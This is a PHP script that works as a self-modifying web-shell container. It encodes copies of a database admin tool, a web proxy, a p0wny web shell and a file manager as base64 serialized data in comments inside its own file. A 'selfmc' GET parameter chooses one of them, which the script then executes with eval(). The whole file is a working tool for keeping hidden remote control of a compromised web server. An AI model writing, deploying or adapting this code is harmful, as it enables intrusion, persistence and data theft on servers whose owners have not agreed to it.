<?php
Class SMC {

  public $tag;
  public $fileData;

  function __construct($tag) {
    $this->tag = $tag;
  }


  // Tries to fetch the UNSERIALIZED data
  function getData() {
    $this->fileData = file_get_contents(__FILE__);
    //echo "+ Looking for tag\n";
    preg_match("/\/\*".$this->tag."(.*)\*\//", $this->fileData, $m);
    if( empty($m) ) {
      //echo "+ No data\n";
      return null;
    } else {
      //echo "+ Found data\n";
      return unserialize(base64_decode($m[1]));
    }
  }

  // Returns the data if available
  // else it adds empty data and return 0
  function init() {
    $data = $this->getData();
    if( $data ) {
      //echo "$data";
      return $data;
    } else {
      //echo "+ No data, writing";
      $data = "init";
      $base64Encoded = base64_encode(serialize($data));
      $newData = "\n<?php /*" . $this->tag . $base64Encoded . "*/ ?>\n";
      //echo "+ Adding $newData";
      $this->fileData .= $newData;
      file_put_contents(__FILE__, $this->fileData);
      return 0;
    }
  }

  function write($object) {
    $this->init();
    $base64Encoded = base64_encode(serialize($object));

    // "I know, I'll use regular expressions."  
    $this->fileData =  preg_replace("/(\/\*".$this->tag.")(.*)(\*\/)/", 
                                    '$1'.$base64Encoded.'$3', 
                                    $this->fileData);
    file_put_contents(__FILE__, $this->fileData);
  }


}


// Some nice projects
// https://www.adminer.org/
// https://github.com/joshdick/miniProx
// https://github.com/flozz/p0wny-shelly 
// https://github.com/prasathmani/tinyfilemanager 
$filenames = array("adminer.php",         
                   "miniProxy.php",      
                   "shell.php",          
                   "tinyfilemanager.php" 
                 );
$files = array();

// Run this once locally to "arm" the file
foreach( $filenames as $filename ) {
  $newFile = new SMC($filename);
  if( ! $newFile->getData() ) {
    $newFile->write( file_get_contents($filename) );
  }
  $files[] = $newFile;
}

// currentFile keeps track of which file should be loaded
$currentFile = new SMC("cf");
if( isset($_GET['selfmc']) ) {
  $currentFile->write($_GET['selfmc']);
  header("Location: " . $_SERVER['PHP_SELF']);
  die();
}


foreach( $files as $file ) {
  if( $currentFile->getData() == $file->tag ) {
    eval(' ?>' .  $file->getData()   );
  }
} 


// If the eval'd file plays nice we might get here. 
// Worst case the user will have to change the GET selfmc variable manually.
echo '<hr>';
foreach( $filenames as $filename ) {
  echo '<a href="?selfmc='.$filename.'">'.$filename.'</a> | ';
}
?>
